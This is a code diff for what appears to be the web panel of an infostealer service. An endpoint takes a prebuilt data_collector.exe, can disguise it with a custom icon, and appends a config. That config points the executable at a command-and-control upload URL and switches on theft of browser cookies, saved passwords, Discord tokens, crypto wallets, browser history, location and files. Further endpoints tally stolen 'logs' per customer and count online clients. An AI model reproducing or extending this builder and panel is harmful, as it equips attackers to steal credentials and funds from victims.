+                    subscriptionRequired: true
+                });
+            }
+
+            if (!features || typeof features !== 'object') {
+                return res.status(400).json({ message: 'features object is required' });
+            }
+
+            // Verify that the user matches the authenticated user
+            if (user && user !== username) {
+                return res.status(403).json({ message: 'Cannot generate payloads for other users' });
+            }
+
+            // Path to the payload executable
+            const payloadPath = path.join(__dirname, '..', 'data_collector.exe');
+
+            // Check if payload exists
+            if (!fs.existsSync(payloadPath)) {
+                return res.status(500).json({ message: 'Payload executable not found. Please build the payload first.' });
+            }
+
+            // Get server URL from environment or construct from request
+            // Always use HTTPS for C2 server (required for secure communication)
+            let serverUrl = process.env.WEBPANEL_URL;
+            if (!serverUrl) {
+                // Check for X-Forwarded-Proto header (when behind reverse proxy like nginx)
+                const forwardedProto = req.headers['x-forwarded-proto'];
+                const isHttps = forwardedProto === 'https' || (forwardedProto === undefined && req.protocol === 'https');
+                const host = req.headers['x-forwarded-host'] || req.get('host') || 'naif.wtf';
+                // Always use HTTPS - strip any existing protocol and force HTTPS
+                const cleanHost = host.replace(/^https?:\/\//, '').split('/')[0];
+                serverUrl = `https://${cleanHost}/api/upload`;
+            } else {
+                // Ensure WEBPANEL_URL uses HTTPS if provided
+                if (!serverUrl.startsWith('https://') && !serverUrl.startsWith('http://')) {
+                    serverUrl = `https://${serverUrl}`;
+                } else if (serverUrl.startsWith('http://')) {
+                    serverUrl = serverUrl.replace('http://', 'https://');
+                }
+                // Ensure it ends with /api/upload
+                if (!serverUrl.endsWith('/api/upload')) {
+                    serverUrl = serverUrl.replace(/\/+$/, '') + '/api/upload';
+                }
+            }
+
+            console.log(`Generating payload for user ${username} with server URL: ${serverUrl}`);
+            console.log(`  - Request protocol: ${req.protocol}`);
+            console.log(`  - X-Forwarded-Proto: ${req.headers['x-forwarded-proto'] || 'not set'}`);
+            console.log(`  - Host: ${req.get('host')}`);
+            console.log(`  - X-Forwarded-Host: ${req.headers['x-forwarded-host'] || 'not set'}`);
+            console.log(`  - Final serverUrl: ${serverUrl}`);
+            console.log(`Selected features:`, features);
+            if (iconPath) {
+                console.log(`Custom icon provided: ${iconPath}`);
+            }
+
+            // If an icon is provided, we need to work with a temp file
+            let exeBuffer;
+            
+            if (iconPath) {
+                // Create a temp copy of the exe to modify
+                tempExePath = path.join(os.tmpdir(), `payload-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.exe`);
+                fs.copyFileSync(payloadPath, tempExePath);
+                
+                // Apply the icon using rcedit meow meow
+                try {
+                    await applyIconToExe(tempExePath, iconPath);
+                    console.log('Custom icon applied successfully');
+                    exeBuffer = fs.readFileSync(tempExePath);
+                } catch (iconError) {
+                    console.error('Failed to apply icon:', iconError);
+                    // Continue without icon on error
+                    exeBuffer = fs.readFileSync(payloadPath);
+                }
+            } else {
+                // No icon, use original exe
+                exeBuffer = fs.readFileSync(payloadPath);
+            }
+
+            // Create the configuration JSON that will be appended
+            // Ensure username is set (use authenticated username, not the user field from request)
+            const embeddedUsername = username; // Use authenticated username from token
+            
+            // Validate username not empty at all
+            if (!embeddedUsername || embeddedUsername.trim() === '') {
+                console.error(`ERROR: Cannot embed empty username in payload for user ${username}`);
+                return res.status(500).json({ message: 'Invalid username - cannot generate payload' });
+            }
+            
+            console.log(`Embedding username in payload: ${embeddedUsername}`);
+            
+            const configJson = JSON.stringify({
+                user: embeddedUsername,
+                serverUrl: serverUrl,
+                collectLocation: features.location || false,
+                collectSystemInfo: features.systemInfo || false,
+                collectRunningProcesses: features.runningProcesses || false,
+                collectInstalledApps: features.installedApps || false,
+                collectBrowserCookies: features.browserCookies || false,
+                collectSavedPasswords: features.savedPasswords || false,
+                collectBrowserHistory: features.browserHistory || false,
+                collectDiscordTokens: features.discordTokens || false,
+                collectCryptoWallets: features.cryptoWallets || false,
+                collectImportantFiles: features.importantFiles || false
+            });
+
+            // Create buffer with marker + config
+            const markerBuffer = Buffer.from(CONFIG_MARKER, 'utf-8');
+            const configBuffer = Buffer.from(configJson, 'utf-8');
+
+            // Combine exe + marker + config
+            const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, configBuffer]);
+
+            // Sanitize output filename (remove invalid chars, ensure .exe extension)
+            let filename = outputName || `payload_${username}_${Date.now()}`;
+            filename = filename.replace(/[<>:"/\\|?*]/g, '_'); // Remove invalid Windows filename chars
+            if (!filename.toLowerCase().endsWith('.exe')) {
+                filename += '.exe';
+            }
+
+            // Set response headers for exe download
+            res.setHeader('Content-Type', 'application/octet-stream');
+            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+            res.setHeader('Content-Length', finalBuffer.length);
+
+            console.log(`Sending patched payload: ${filename} (${finalBuffer.length} bytes)`);
+
+            // Send the patched exe
+            res.send(finalBuffer);
+
+        } catch (error) {
+            console.error('Error generating payload:', error);
+            res.status(500).json({ message: 'Internal server error', error: error.message });
+        } finally {
+            // Cleanup temp files
+            if (tempExePath && fs.existsSync(tempExePath)) {
+                try { fs.unlinkSync(tempExePath); } catch (e) { /* ignore */ }
+            }
+            if (iconPath && fs.existsSync(iconPath)) {
+                try { fs.unlinkSync(iconPath); } catch (e) { /* ignore */ }
+            }
+        }
+    });
+});
+
+app.get('/api/stats', authenticateToken, (req, res) => {
+    try {
+        const username = req.user.username;
+        
+        // Get all logs and filter by user (same logic as /api/logs)
+        let logs = logsDb.getAll();
+        logs = logs.filter(log => {
+            const logUser = log.user;
+            if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
+                return username === 'account';
+            }
+            return logUser === username;
+        });
+        
+        // Get general stats (for online/dead clients - these are global)
+        const allStats = logsDb.getStats();
+        
+        // Return stats with user-specific log count
+        res.json({
+            ...allStats,
+            totalLogs: logs.length // User-specific log count
+        });
     } catch (error) {
         console.error('Error fetching stats:', error);
         res.status(500).json({ message: 'Internal server error' });
     }
 });
 
-app.get('/api/statistics', (req, res) => {
+app.get('/api/statistics', authenticateToken, (req, res) => {
     console.log('Statistics endpoint hit!');
     try {
-        const logs = logsDb.getAll();
+        const username = req.user.username;
+        
+        // Get all logs and filter by user
+        let logs = logsDb.getAll();
+        logs = logs.filter(log => {
+            const logUser = log.user;
+            if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
+                return username === 'account';
+            }
+            return logUser === username;
+        });
+        
         const totalLogs = logs.length;
         
         // Calculate country distribution
